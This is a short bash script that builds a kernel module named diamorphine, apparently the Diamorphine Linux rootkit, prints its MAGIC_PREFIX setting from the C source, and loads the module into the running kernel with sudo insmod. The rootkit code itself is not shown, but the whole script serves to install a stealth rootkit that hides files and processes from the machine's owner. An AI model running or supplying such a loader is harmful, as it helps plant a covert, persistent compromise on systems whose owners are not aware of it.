#!/bin/bash
make
koFile=diamorphine.ko
cFile=diamorphine.c
if test -f "$koFile"; then #testing if .ko was built properly
    
    while IFS=: read -r c1 c2; do
        [[ $c1 == "#define MAGIC_PREFIX" ]] && var=$c1
        [[ $c1 == INFO ]] && echo "$var$c2"
    done < "$cFile"

    sudo insmod "$koFile"
    echo "built."

fi